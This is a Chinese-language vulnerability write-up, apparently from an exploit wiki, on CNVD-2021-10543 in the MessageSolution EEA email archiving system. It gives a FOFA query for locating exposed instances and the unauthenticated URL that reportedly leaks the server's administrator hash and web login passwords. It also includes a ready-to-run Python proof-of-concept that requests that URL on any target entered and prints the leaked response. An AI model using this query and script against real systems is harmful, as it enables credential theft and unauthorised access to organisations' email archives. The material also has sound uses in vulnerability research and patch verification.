# MessageSolution  邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543

## 漏洞描述

MessageSolution企业邮件归档管理系统 EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator hash与web账号密码

## 漏洞影响

> [!NOTE]
>
> MessageSolution 企业邮件归档管理系统EEA

## FOFA

> [!NOTE]
>
> title="MessageSolution Enterprise Email Archiving (EEA)"

## 漏洞复现

登录页面如下

![](http://wikioss.peiqi.tech/vuln/mess-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

 访问如下Url

```
http://xxx.xxx.xxx.xxx/authenticationserverservlet/
```

![](http://wikioss.peiqi.tech/vuln/mess-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

使用获得到的密码可以登录系统

![](http://wikioss.peiqi.tech/vuln/mess-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

## 漏洞利用POC

```python
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: MessageSolution 企业邮件归档管理系统EEA                         \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')


def POC_1(target_url):
    vuln_url = target_url + "/authenticationserverservlet/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and "administrator" in response.text:
            print("\033[32m[o] 目标 {} 存在信息泄露 响应为:{}\033[0m".format(target_url, response.text))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))




if __name__ == "__main__":
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```

![](http://wikioss.peiqi.tech/vuln/mess-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

## Goby & POC

> [!NOTE]
>
> MessageSolution  邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543
>
> Goby & POC 已经更新到 Github中

![](http://wikioss.peiqi.tech/vuln/mess-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

## 参考文章

https://mp.weixin.qq.com/s/jehAIIYWrpkLtGvGN-LtFA